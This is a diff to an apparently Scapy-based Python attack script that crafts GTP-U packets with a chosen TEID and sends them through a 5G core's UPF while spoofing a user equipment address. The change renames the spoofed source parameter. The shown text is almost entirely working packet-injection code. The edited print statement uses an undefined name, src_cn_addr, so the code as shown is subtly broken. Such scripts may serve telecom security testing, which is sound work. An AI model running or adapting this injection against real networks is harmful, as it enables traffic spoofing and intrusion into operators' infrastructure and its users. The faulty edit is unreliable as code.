@@ -40,7 +40,7 @@ arping(UPF_ADDR)
 
 
 def start_gtp_uplink_attack(
-    gnb_addr, upf_addr, teid, ue_addr, dst_addr, upf_dport=2152
+    src_addr, upf_addr, teid, ue_addr, dst_addr, upf_dport=2152
 ):
 
     ip_payload = (
@@ -52,13 +52,13 @@ def start_gtp_uplink_attack(
     gtpu_header = GTP_U_Header(teid=teid) / ip_payload
 
     packet = (
-        IP(src=gnb_addr, dst=upf_addr)
+        IP(src=src_addr, dst=upf_addr)
         / UDP(dport=upf_dport, sport=upf_dport)
         / gtpu_header
     )
 
     print(
-        f"[i]  Sending GTP-U packet to {dst_addr} through UPF ({upf_addr}), TEID {teid}, spoofing UE {ue_addr}, source IP {gnb_addr}"
+        f"[i]  Sending GTP-U packet to {dst_addr} through UPF ({upf_addr}), TEID {teid}, spoofing UE {ue_addr}, source IP {src_cn_addr}"
     )
 
     send(packet)
@@ -66,7 +66,7 @@ def start_gtp_uplink_attack(
 
 
 start_gtp_uplink_attack(
-    gnb_addr=GNB_ADDR,
+    src_addr=SRC_ADDR,
     upf_addr=UPF_ADDR,
     teid=TEID,
     ue_addr=UE_ADDR,
